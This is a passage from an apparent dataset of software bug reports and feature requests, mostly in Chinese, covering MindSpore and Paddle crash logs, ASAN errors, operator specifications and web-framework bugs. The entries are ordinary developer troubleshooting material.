Process received signal *** what(): mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:86 AllocContinuousTensorMem] Can't find the device address[0x7fe7a3aace00]. *** Process received signal *** Signal: Aborted (6) Signal code: (-6) *** Process received signal *** Signal: Aborted (6) Signal code: (-6) *** Process received signal *** Signal: Aborted (6) Signal code: (-6) Signal: Aborted (6) Signal code: (-6) *** Process received signal *** Signal: Aborted (6) Signal code: (-6) *** Process received signal *** Signal: Aborted (6) Signal code: (-6) *** Process received signal *** Signal: Aborted (6) Signal code: (-6) *** Process received signal *** Signal: Aborted (6) Signal code: (-6) [ 6] /home/miniconda3/envs/ci/bin/../lib/libstdc++.so.6(__cxa_rethrow+0x0)[0x7f49695ff15a] [ 7] /home/miniconda3/envs/ci/bin/../lib/libstdc++.so.6(__cxa_rethrow+0x0)[0x7f2b20d2f15a] [ 7] /home/miniconda3/envs/ci/bin/../lib/libstdc++.so.6(__cxa_rethrow+0x0)[0x7f8752d5115a] [ 7] /home/miniconda3/envs/ci/bin/../lib/libstdc++.so.6(__cxa_rethrow+0x0)[0x7f7c532d715a] [ 7] [ 7] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7f0708ca65f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7f49524c05f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7f2b09bf05f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7f873bc125f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7f74872d55f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7f7c3c1985f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7feae4fd15f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0xe985f7)[0x7fc9dc8965f7] [ 8] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7feae581d354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7f07094f2354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7f4952d0c354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7f2b0a43c354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7f873c45e354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7f7487b21354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7f7c3c9e4354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_c_expression.cpython-37m-x86_64-linux-gnu.so(+0x16e4354)[0x7fc9dd0e2354] [ 9] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7f7c2c25afec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7fead5093fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7f06f8d68fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7f4942582fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7f2af9cb2fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7f872bcd4fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7f7477397fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_core.so(_ZNK9mindspore9LogWritereoERKNS_9LogStreamE+0x18c)[0x7fc9cc958fec] [10] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_backend.so(+0x53999ba)[0x7f747fb0d9ba] [11] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_backend.so(+0x53999ba)[0x7f7c349d09ba] [11] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_backend.so(+0x53999ba)[0x7feadd8099ba] [11] /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/lib/libmindspore_backend.so(+0x53999ba)[0x7f07014de9ba]"
【众智】【数据算子】HighpassBiquad,"1. 功能介绍 1.1算子分析 据此可设零状态二阶通用滤波器的传递函数为： G(s)=(b_0×s^2+b_1×s^1+b_2×s^0)/(a_0×s^2+a_1×s^1+a_2×s^0 ) 我们可以通过一个曲线直观的展示高通滤波器： highpass_biquad_op.cc <td rowspan=""2"">算子Op件名称 <td colspan=""4"" rowspan=""2"">HighpassBiquadOp <td rowspan=""2"">中间表示层IR名称 <td colspan=""4"" rowspan=""2"">HighpassBiquadOperation <td rowspan=""2"">C++接口名称 <td colspan=""4"" rowspan=""2"">HighpassBiquad   <code>: 高通滤波(high-pass filter) 是一种过滤方式，规则为高频信号能正常通过，而低于设定临界值的低频信号则被阻隔、减弱。但是阻隔、减弱的幅度则会依据不同的频率以及不同的滤波程序（目的）而改变。它有的时候也被叫做低频去除过滤（low-cut filter）。高通滤波是低通滤波的对立。而二阶滤波则表示的是滤波器时域表达式中最高含有二阶微分，或者说传递函数分母的s最高次数为2。滤波器对直流分量的增益为1。 Class mindspore.dataset.audio.transforms.HighpassBiquad(sample_rate,cutoff_freq,Q) HighpassBiquad(int32 sample_rate, float cutoff_freq, float Q);"
test_dynrnn_gradient_check failed,"The log link is https://paddleci.ngrok.io/downloadBuildLog.html?buildId=22019   <code>: [09:17:00] : [Step 1/1] 295/310 Test #294: test_dynrnn_gradient_check ..................***Failed 3.25 sec [09:17:00] : [Step 1/1] .F [09:17:00] : [Step 1/1] ====================================================================== [09:17:00] : [Step 1/1] FAIL: test_forward_backward (__main__.TestSimpleMulWithMemory) [09:17:00] : [Step 1/1] ---------------------------------------------------------------------- [09:17:00] : [Step 1/1] Traceback (most recent call last): [09:17:00] : [Step 1/1] File ""/paddle/python/paddle/v2/fluid/tests/decorators.py"", line 25, in __fn__ [09:17:00] : [Step 1/1] fn(*args, **kwargs) [09:17:00] : [Step 1/1] File ""test_dynrnn_gradient_check.py"", line 343, in test_forward_backward [09:17:00] : [Step 1/1] self.assertTrue(numpy.allclose(i_g_num, i_g, rtol=0.1)) [09:17:00] : [Step 1/1] AssertionError: False is not true [09:17:00] : [Step 1/1] [09:17:00] : [Step 1/1] ---------------------------------------------------------------------- [09:17:00] : [Step 1/1] Ran 2 tests in 1.581s [09:17:00] : [Step 1/1] [09:17:00] : [Step 1/1] FAILED (failures=1)"
从采购订单生成采购入库单后，返回父表单刷新数据逻辑错误,"由于不涉及变动数据的显示，这个错误在PSI主分支上目前没有显式的影响 1）在POMainForm.js中onGenPWBill方法创建PWEditForm时，未传入parentForm参数，所以在PWEdit的onOK方法中，调用getParentForm将为空，不能实现对父表单的刷新调用 2）进一步，若getParentForm能够正确得到父表单后，其调用refreshMainGrid所需的参数，对于返回并刷新采购订单管理界面，应该用pobill的ID而非pwbill的ID 参考解决方法： 1）在POMainForm中调用PWEditForm时，传入parentForm和pobillID参数 2）在PWEditForm中区分刷新父表单所需的ID   <code>: var form = Ext.create(""PSI.Purchase.PWEditForm"", { genBill : true, parentForm : me, /*FOODTRUST*/ pobillId : bill.get(""id""), /*FOODTRUST*/ pobillRef : bill.get(""ref"") }); if (success) { var data = me.decodeJSON(response.responseText); if (data.success) { me.showInfo(""入库单已生成！相关采购订单也已审核（如果存在），爱你~么么哒"", function() { me.close(); var pf = me.getParentForm(); if (pf) { if(me.getPobillId()) { /* 刷新采购订单列表中对应的采购订单数据 */ pf.refreshMainGrid(me.getPobillId()); }else{ /* 刷新入库单列表中对应的入库单数据 */ pf.refreshMainGrid(data.id); } } }); } else { me.showInfo(data.msg); } }"
升级 Spring Cloud Hoxton.SR2,"好消息 已于 2020.02.19 发布。 SR版本： 正式版的修正 Project 虽然project 版本依旧是 ,但确实已发布。 如前所述，Spring Cloud Hoxton.SR2也已发布，但仅包含对Spring Cloud Stream和Spring Cloud Function的更新。 相关链接 https://spring.io/blog/2020/02/19/announcing-spring-cloud-stream-horsham-sr2-3-0-2-release-and-spring-cloud-hoxton-sr2 https://github.com/spring-cloud/spring-cloud-release/milestones?state=closed   <code>: Spring Cloud Hoxton.SR2 &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR2&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; SR1 SR2 issue bug fix"
ASAN errors,"ASAN error: alloc-dealloc-mismatch and new-delete-type-mismatch : /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : cpp ut compile cpp ut run cpp ut UT runs fail cause ASAN reports error: alloc-dealloc-mismatch new-delete-type-mismatch UT pass   <code>: ================================================================= ==28880==ERROR: AddressSanitizer: alloc-dealloc-mismatch (operator new [] vs operator delete) on 0x6190020a7180 #0 0x7fdc55b48d58 in operator delete(void*, unsigned long) (/usr/local/gcc/gcc730/lib64/libasan.so.4+0xdbd58) #1 0xa400418 in mindspore::ps::core::TcpMessageHandler::ReceiveMessage(void const*, unsigned long) (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0xa400418) #2 0x7d3f27a in mindspore::ps::core::TestTcpMessageHandler_16Header_2meta_1000Data_Test::TestBody() (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x7d3f27a) #3 0x7fdc5585b549 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x3f549) #4 0x7fdc55851b29 in testing::Test::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x35b29) #5 0x7fdc55851c6f in testing::TestInfo::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x35c6f) #6 0x7fdc55851d44 in testing::TestCase::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x35d44) #7 0x7fdc558521cc in testing::internal::UnitTestImpl::RunAllTests() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x361cc) #8 0x7fdc5585ba59 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x3fa59) #9 0x7fdc55852344 in testing::UnitTest::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x36344) #10 0x53b65b in main (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x53b65b) #11 0x7fdc49289454 in __libc_start_main (/lib64/libc.so.6+0x22454) #12 0x527370b (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x527370b) 0x6190020a7180 is located 0 bytes inside of 1002-byte region [0x6190020a7180,0x6190020a756a) allocated by thread T0 here: #0 0x7fdc55b47b70 in operator new[](unsigned long) (/usr/local/gcc/gcc730/lib64/libasan.so.4+0xdab70) #1 0xa4006a4 in mindspore::ps::core::TcpMessageHandler::ReceiveMessage(void const*, unsigned long) (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0xa4006a4) #2 0x7d3f27a in mindspore::ps::core::TestTcpMessageHandler_16Header_2meta_1000Data_Test::TestBody() (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x7d3f27a) #3 0x7fdc5585b549 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x3f549) SUMMARY: AddressSanitizer: alloc-dealloc-mismatch (/usr/local/gcc/gcc730/lib64/libasan.so.4+0xdbd58) in operator delete(void*, unsigned long) ==28880==HINT: if you don't care about these errors you may set ASAN_OPTIONS=alloc_dealloc_mismatch=0 ================================================================= ==28880==ERROR: AddressSanitizer: new-delete-type-mismatch on 0x6190020a7180 in thread T0: object passed to delete has wrong type: size of the allocated type: 1002 bytes; size of the deallocated type: 1 bytes. #0 0x7fdc55b48d58 in operator delete(void*, unsigned long) (/usr/local/gcc/gcc730/lib64/libasan.so.4+0xdbd58) #1 0xa400418 in mindspore::ps::core::TcpMessageHandler::ReceiveMessage(void const*, unsigned long) (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0xa400418) #2 0x7d3f27a in mindspore::ps::core::TestTcpMessageHandler_16Header_2meta_1000Data_Test::TestBody() (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x7d3f27a) #3 0x7fdc5585b549 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x3f549) #4 0x7fdc55851b29 in testing::Test::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x35b29) #5 0x7fdc55851c6f in testing::TestInfo::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x35c6f) #6 0x7fdc55851d44 in testing::TestCase::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x35d44) #7 0x7fdc558521cc in testing::internal::UnitTestImpl::RunAllTests() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x361cc) #8 0x7fdc5585ba59 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x3fa59) #9 0x7fdc55852344 in testing::UnitTest::Run() (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x36344) #10 0x53b65b in main (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x53b65b) #11 0x7fdc49289454 in __libc_start_main (/lib64/libc.so.6+0x22454) #12 0x527370b (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x527370b) 0x6190020a7180 is located 0 bytes inside of 1002-byte region [0x6190020a7180,0x6190020a756a) allocated by thread T0 here: #0 0x7fdc55b47b70 in operator new[](unsigned long) (/usr/local/gcc/gcc730/lib64/libasan.so.4+0xdab70) #1 0xa4006a4 in mindspore::ps::core::TcpMessageHandler::ReceiveMessage(void const*, unsigned long) (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0xa4006a4) #2 0x7d3f27a in mindspore::ps::core::TestTcpMessageHandler_16Header_2meta_1000Data_Test::TestBody() (/home/jenkins/agent/workspace/MindSpore_Enterprise_SC_ASAN/mindspore/build/mindspore/tests/ut/cpp/ut_tests+0x7d3f27a) #3 0x7fdc5585b549 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/jenkins/.mslib/gtest_7fcaa520c2807bc964966e1e3e936484/lib64/libgtest.so+0x3f549)"
table的单元格编辑问题,"想知道为什么数据为 0 时，编辑框内会有‘个’，非 0 时却没有‘个’   <code>: cols:[[ ... {...,edit:'text',templet:function(d){ return ""&lt;a&gt;""+d.num+""个&lt;/a&gt;""; }} ]]"
"""fix client send empty gradients bug""","In some miss use situation, SendGrads will get empty slice here, then will block forever.   <code>: errCh // SendGrads sends gradients to parameter servers for updating // parameters. func (c *Client) SendGrads(grads []Gradient) error { if len(grads) == 0 { log.Info(""Send Empty Gradient"") return nil } errCh := make(chan error, len(grads)) for _, g := range grads { go func(g Gradient) { err := c.pservers[c.partition(g.Name)].Call(""Service.SendGrad"", g, nil) errCh &lt;- err }(g) } recv := 0 for err := range errCh { if err != nil { return err }"
【众智】【计算-GPU开发】RGBToHSV,"将一张或多张图像从 RGB 转换为 HSV。 接口目录：mindspore/ops/operations/image_ops.py images y 对应底层算子 Classify Name Type Type Range Required INPUT images fp16, fp32,double TRUE OUTPUT y fp16, fp32,double TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/RGBToHSV?hl=zh-tw 3. 异常处理 4. 算子反向 Tensorflow: 参考tensorflow/python/ops/image_grad.py #L170-L381 @ops.RegisterGradient(""RGBToHSV"") def _RGBToHSVGrad(op, grad):   <code>: class RGBToHSV(Primitive):"
当后台“界面基础图片目录 {IMGDIR}:” 设置为一个远程地址时,"DiscuzX / upload / template / default / common / header.htm 当后台“界面基础图片目录 {IMGDIR}:” 设置为一个远程地址后就变成 icon-uri=http://www.xxx.com/http://www.xxx.com/static/image/common/portal.ico   <code>: &lt;meta name= ""msapplication-task"" content= ""name=$_G['setting']['navs'][2]['navname'];action-uri={echo !empty($_G['setting' ]['domain']['app']['forum']) ? 'http://'.$_G['setting']['domain']['app']['forum'] : $_G [siteurl].'forum.php'};icon-uri={$_G[siteurl]}{IMGDIR}/bbs.ico"" /&gt;"
【论文复现】无法deepcopy,"Platform: AIStudio Version: 2.1.2 这种问题一般如何排查   <code>: ---------------------------------------------------------------------------RuntimeError Traceback (most recent call last)&lt;ipython-input-12-394d1b556b53&gt; in &lt;module&gt; ----&gt; 1 deepcopy(model) /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 178 y = x 179 else: --&gt; 180 y = _reconstruct(x, memo, *rv) 181 182 # If is its own copy, don't memoize. /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy) 278 if state is not None: 279 if deep: --&gt; 280 state = deepcopy(state, memo) 281 if hasattr(y, '__setstate__'): 282 y.__setstate__(state) /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 148 copier = _deepcopy_dispatch.get(cls) 149 if copier: --&gt; 150 y = copier(x, memo) 151 else: 152 try: /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _deepcopy_dict(x, memo, deepcopy) 238 memo[id(x)] = y 239 for key, value in x.items(): --&gt; 240 y[deepcopy(key, memo)] = deepcopy(value, memo) 241 return y 242 d[dict] = _deepcopy_dict /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 178 y = x 179 else: --&gt; 180 y = _reconstruct(x, memo, *rv) 181 182 # If is its own copy, don't memoize. /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy) 304 for key, value in dictiter: 305 key = deepcopy(key, memo) --&gt; 306 value = deepcopy(value, memo) 307 y[key] = value 308 else: /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 178 y = x 179 else: --&gt; 180 y = _reconstruct(x, memo, *rv) 181 182 # If is its own copy, don't memoize. /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy) 278 if state is not None: 279 if deep: --&gt; 280 state = deepcopy(state, memo) 281 if hasattr(y, '__setstate__'): 282 y.__setstate__(state) /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 148 copier = _deepcopy_dispatch.get(cls) 149 if copier: --&gt; 150 y = copier(x, memo) 151 else: 152 try: /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _deepcopy_dict(x, memo, deepcopy) 238 memo[id(x)] = y 239 for key, value in x.items(): --&gt; 240 y[deepcopy(key, memo)] = deepcopy(value, memo) 241 return y 242 d[dict] = _deepcopy_dict /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 178 y = x 179 else: --&gt; 180 y = _reconstruct(x, memo, *rv) 181 182 # If is its own copy, don't memoize. /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy) 304 for key, value in dictiter: 305 key = deepcopy(key, memo) --&gt; 306 value = deepcopy(value, memo) 307 y[key] = value 308 else: /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 178 y = x 179 else: --&gt; 180 y = _reconstruct(x, memo, *rv) 181 182 # If is its own copy, don't memoize. /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy) 278 if state is not None: 279 if deep: --&gt; 280 state = deepcopy(state, memo) 281 if hasattr(y, '__setstate__'): 282 y.__setstate__(state) /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 148 copier = _deepcopy_dispatch.get(cls) 149 if copier: --&gt; 150 y = copier(x, memo) 151 else: 152 try: /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _deepcopy_dict(x, memo, deepcopy) 238 memo[id(x)] = y 239 for key, value in x.items(): --&gt; 240 y[deepcopy(key, memo)] = deepcopy(value, memo) 241 return y 242 d[dict] = _deepcopy_dict /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 178 y = x 179 else: --&gt; 180 y = _reconstruct(x, memo, *rv) 181 182 # If is its own copy, don't memoize. /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in _reconstruct(x, memo, func, args, state, listiter, dictiter, deepcopy) 304 for key, value in dictiter: 305 key = deepcopy(key, memo) --&gt; 306 value = deepcopy(value, memo) 307 y[key] = value 308 else: /opt/conda/envs/python35-paddle120-env/lib/python3.7/copy.py in deepcopy(x, memo, _nil) 159 copier = getattr(x, ""__deepcopy__"", None) 160 if copier: --&gt; 161 y = copier(memo) 162 else: 163 reductor = dispatch_table.get(cls) /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py in __deepcopy__(self, memo) 496 if not self.is_leaf: 497 raise RuntimeError( --&gt; 498 ""Only Leaf Tensor support the deepcopy at the moment, non-Leaf Tensors contains graph information that does't support deepcopy"" 499 ) 500 new_varbase = core.VarBase() RuntimeError: Only Leaf Tensor support the deepcopy at the moment, non-Leaf Tensors contains graph information that does't support deepcopy"
[WIP]MS][Frac] Frac has some problems about doc Test at ascend,"在ascend环境 两种模式下 运行测试样例 pytest -vra --doctest-modules -o doctest_optionflags=NORMALIZE_WHITESPACE --tb=long ops/function/math_func.py::mindspore.ops.function.math_func.frac 报错 TypeError: If is not a Tensor. 3127 3128 Examples: 3129 &gt;&gt;&gt; import mindspore 3130 &gt;&gt;&gt; import numpy as np 3131 &gt;&gt;&gt; from mindspore import Tensor 3132 &gt;&gt;&gt; from mindspore.common import dtype as mstype 3133 &gt;&gt;&gt; import mindspore.ops as ops 3134 &gt;&gt;&gt; x = Tensor([2, 4.2, -2.5], mstype.float16) 3135 &gt;&gt;&gt; output = frac(x) 显示机器可用内存不足，但是换了机器，也换了deviceid 有空余内存的 仍然失败了 ，但是在跑测试用例的时候没有任何问题 /mode graph   <code>: x"
mysql8.0无法执行升级脚本。为什么2.2的不给一个全量的sql包呢,版本号： 2.2 mysql8.0 无法执行升级脚本 [SQL] Query 2.1.4升级到2.2.0mysql start [ERR] 1060 - Duplicate column name 'converter' [ERR] ALTER TABLE MODIFY COLUMN varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '字典表' AFTER ; ALTER TABLE ADD COLUMN varchar(255) NULL COMMENT '自定义值转换器' AFTER ; 友情提示： 未按格式要求发帖，会直接删掉。   <code>: onl_cgform_field dict_table dict_field onl_cgform_field converter create_by
Move Init function into `paddle::framework`,"Make interfaces in Util.h not changed, but call . The InitFunction will be used when implement Op registry.   <code>: paddle::framework"
crud的其中一个字段类型为radio dicData为true和false时，值为false打开编辑页false未被选中,"之前老版本没问题，升级avue 2.5.3之后发现的这个问题，查看页没问题，新增默认值为false和编辑当前值为false时都有问题 option如下   <code>: { ""option"": { ""column"": [{ ""label"": ""ID"", ""prop"": ""id"", ""hide"": true, ""addDisplay"": false, ""editDisplay"": false, ""sortable"": true }, { ""label"": ""名称"", ""placeholder"": ""名称"", ""prop"": ""name"", ""maxlength"": 128, ""showWordLimit"": true, ""rules"": [{ ""required"": true, ""message"": """", ""trigger"": ""blur"" }], ""sortable"": true }, { ""label"": ""中文名称"", ""placeholder"": ""中文名称"", ""prop"": ""cname"", ""maxlength"": 128, ""showWordLimit"": true, ""rules"": [{ ""required"": true, ""message"": """", ""trigger"": ""blur"" }] }, { ""label"": ""类别"", ""placeholder"": ""类别"", ""prop"": ""category"", ""maxlength"": 128, ""showWordLimit"": true, ""value"": ""default"", ""rules"": [{ ""required"": true, ""message"": """", ""trigger"": ""blur"" }], ""sortable"": true }, { ""label"": ""加密"", ""placeholder"": ""加密"", ""prop"": ""encrypted"", ""dicData"": [{ ""label"": ""是"", ""value"": true }, { ""label"": ""否"", ""value"": false }], ""type"": ""radio"", ""value"": false, ""rules"": [{ ""required"": true, ""message"": """", ""trigger"": ""blur"" }] }, { ""label"": ""开启"", ""placeholder"": ""开启"", ""prop"": ""enabled"", ""dicData"": [{ ""label"": ""是"", ""value"": true }, { ""label"": ""否"", ""value"": false }], ""type"": ""radio"", ""value"": true, ""rules"": [{ ""required"": true, ""message"": """", ""trigger"": ""blur"" }] }, { ""label"": ""值"", ""placeholder"": ""值"", ""prop"": ""value"", ""span"": 24, ""type"": ""textarea"" }, { ""label"": ""备注"", ""placeholder"": ""备注"", ""prop"": ""remark"", ""maxlength"": 255, ""showWordLimit"": true }], ""searchVisible"": true } }"
2.5.3 tree 组件,"改为以下返回后,如何知道是在哪个节点下进行的操作呢   <code>: this.$emit(""save"", this.obj, this.node, callback, done); this.$emit(""save"", data, callback, done);"
"[MS][LITE][master][control flow] control flow contions bool values, CompileGraph failed",": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 模型推理成功   <code>: 1. 云侧导出控制流的mindir模型 2. 将mindir模型转换为ms模型 3. 将ms模型推送到手机，执行一下命令 ./benchmark --modelFile=ControlOneBoolWhileOneAddn.ms ./benchmark --modelFile=ControlOneIfBoolOneAddnOneAddn.ms 模型见附件 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/src/lite_mindrt.cc:516] GetSwitchAndCallNode] actor name: CpuFP32SubGraph3_0@ ;s switch node Default/Switch-op47452 input size: 2 but switch_node-&gt;in_tensors()[0] is not const 09-18 10:03:29.197 13391 13391 E MS_LITE : [mindspore/lite/src/lite_mindrt.cc:557] CompileArrowThroughSwitchCall] GetSwitchAndCallCnode failed. 09-18 10:03:29.197 13391 13391 E MS_LITE : 